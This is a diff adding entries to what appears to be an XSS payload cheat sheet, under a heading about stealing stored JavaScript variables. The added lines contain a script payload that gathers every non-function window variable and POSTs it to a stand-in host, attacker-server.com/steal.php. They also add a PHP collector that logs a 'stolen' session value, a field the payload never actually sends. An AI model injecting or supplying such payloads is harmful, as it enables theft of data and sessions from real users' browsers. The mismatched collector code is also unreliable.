@@ -53,7 +53,26 @@ python3 -m http.server -m 80
 ### One Liner to steal all stored js variables
 
 ```
+# to the console
 <script>for(var p in window) window.hasOwnProperty(p)&&"function"!=typeof window[p]&&console.log(p+": "+window[p])</script>
+
+# to remote server
+<script>
+  var xhr = new XMLHttpRequest();
+  xhr.open('POST', 'https://attacker-server.com/steal.php', true);
+  xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
+  var variables = {};
+  for (var p in window) {
+    if (window.hasOwnProperty(p) && typeof window[p] !== 'function') {
+      variables[p] = window[p];
+    }
+  }
+  xhr.send(JSON.stringify(variables));
+</script>
+
+# contents of steal.php (I dont know if its needed though)
+<?php $p_session = $_POST['p_session']; // Accessing the stolen p_session value // Log or process the stolen value as desired $logFile = 'stolen_data.log'; $logData = date('Y-m-d H:i:s') . ' - p_session: ' . $p_session . "\n"; file_put_contents($logFile, $logData, FILE_APPEND); ?>
+
 ```
 
 ### Downloader for longer XSS payloads
